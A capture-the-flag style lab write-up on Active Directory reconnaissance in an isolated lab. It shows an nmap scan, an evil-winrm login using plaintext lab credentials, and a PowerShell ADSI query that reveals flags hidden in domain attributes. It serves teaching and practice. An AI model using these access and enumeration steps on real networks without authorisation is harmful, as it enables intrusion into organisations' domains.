# Active Directory Basics: Domain Reconnaissance Walkthrough

## 1. Environment Topology

The assessment environment consists of three virtual machines hosted within an isolated VirtualBox NAT Network (`10.0.2.0/24`):

* **Attacker Host:** Kali Linux
* **Workstation (Foothold):** Windows 11 Enterprise (`10.0.2.3`), pre-configured with local administrative credentials (`labuser` : `P@ssw0rd123!`) and WinRM enabled.
* **Domain Controller (Target):** Windows Server 2019 running the Active Directory Domain Services role for the `PENTESTLAB.local` domain.

---

## 2. Execution Walkthrough

### Phase 1: External Enumeration & Pivot Determination
Initial reconnaissance from the Kali Linux host targeted the Windows Server IP to check for open Active Directory ports—specifically LDAP (TCP 389) and Global Catalog (TCP 3268).

```bash
nmap -p 389,3268 -Pn 10.0.2.4
```
The scan returned both ports as filtered, indicating that a host-based firewall on the Domain Controller blocks direct network traffic from unauthenticated external subnets.

Because direct external enumeration was blocked, the attack vector shifted to an assumed-breach scenario, leveraging the provided WinRM credentials to pivot through the trusted internal Windows 11 workstation.
Phase 2: Establishing the Network Foothold

Using evil-winrm, an authenticated remote PowerShell session was established from the Kali host to the Windows 11 machine.
Bash
```bash
evil-winrm -i 10.0.2.3 -u labuser -p 'P@ssw0rd123!'
```
This dropped the execution context into a stable PowerShell prompt on the target subnet:
PowerShell
```
*Evil-WinRM* PS C:\Users\labuser\Documents>
```
Phase 3: Directory Enumeration via ADSI

Active Directory firewalls typically trust directory queries originating from domain-joined workstations. To extract the hidden flag from the root domain object without using specialized offensive tools that might trigger alerts, native Active Directory Service Interfaces (ADSI) were utilized.

The following script was executed in the WinRM session:
PowerShell

# Query the RootDSE to find the default naming context dynamically
```PS
$Domain = [ADSI]"LDAP://RootDSE"
$RootDN = $Domain.defaultNamingContext

# Bind directly to the root domain object
$ADObject = [ADSI]"LDAP://$RootDN"

# Force ADSI to retrieve both standard (*) and operational/hidden (+) attributes
$ADObject.RefreshCache(@("*", "+"))

# Display all properties
$ADObject | Select-Object -Property *
```
Technical Logic of the Script:

    LDAP://RootDSE: Accesses the root of the directory server data tree to map the exact Distinguished Name (DC=PENTESTLAB,DC=local) dynamically.

    .RefreshCache(@("*", "+")): Standard Active Directory queries do not return operational attributes. Passing the + control character explicitly forces the Domain Controller to return operational, non-standard, and extended schema attributes that are normally withheld during routine administrative lookups.

3. Data Analysis & Output Verification

The output of the ADSI command exposed the full attribute dictionary of the root domain object. Two distinct flags were discovered within the text output:
Domain Identity Details
Plaintext

distinguishedName : {DC=PENTESTLAB,DC=local}
name              : {PENTESTLAB}

Captured Flags
🔑 Primary Flag

Located inside the standard description attribute of the domain root:
```Plaintext

description       : {FLAG{518f239e03cdf54404f6bc907997efcd60863dc920ee15aa73753ec6551e}}
```
🔑 Secondary Flag

Located inside the adminDescription operational attribute:
```Plaintext

adminDescription  : {PVFLAG{D0M41N_M4PP3D_W1TH_P0W3RV13W_F0}}
```
    [!NOTE]
    The PVFLAG prefix and context indicate this attribute was configured to simulate the underlying API calls executed by domain enumeration tooling like PowerView.
